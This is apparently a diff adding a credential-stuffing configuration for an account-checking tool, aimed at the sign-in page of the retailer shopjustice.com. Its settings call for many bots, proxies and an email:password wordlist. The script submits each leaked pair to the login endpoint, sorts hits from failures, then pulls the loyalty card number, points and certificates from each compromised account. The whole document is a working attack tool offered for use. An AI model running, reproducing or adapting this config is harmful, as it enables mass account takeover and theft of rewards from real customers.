@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "shopjustice.com",
+  "SuggestedBots": 150,
+  "LastModified": "2018-06-10T20:04:38.960899+00:00",
+  "AdditionalInfo": "",
+  "Author": "Dreamzje [ KEEPIT.ONLINE ]",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_REQUEST REQUEST POST "https://www.shopjustice.com/justice/baseAjaxServlet?pageId=SignInRequest " AutoRedirect=TRUE 
+  CONTENT "Action=AM.signRequestFire&userEmail=<USER>&userPassword=<PASS>&modalRefer=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Your username/password is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"success\"" 
+#SECOND_POST_REQUEST REQUEST POST "https://www.shopjustice.com/justice/baseAjaxServlet?pageId=Rewards" AutoRedirect=TRUE 
+  CONTENT "Action=Loyalty.getPointsAndCerts" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Referer: https://www.shopjustice.com/justice/account/account-dashboard.jsp" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+PARSE "<SOURCE>" LR "cardNumber\":\"" "\"" Recursive=FALSE -> CAP "CardNumber" "" "" 
+PARSE "<SOURCE>" LR "currentPoints\":" "," Recursive=FALSE -> CAP "Current Points" "" "" 
+PARSE "<SOURCE>" LR "currentCertificates\":" "}" Recursive=FALSE -> CAP "Current Certificates" "" "" 
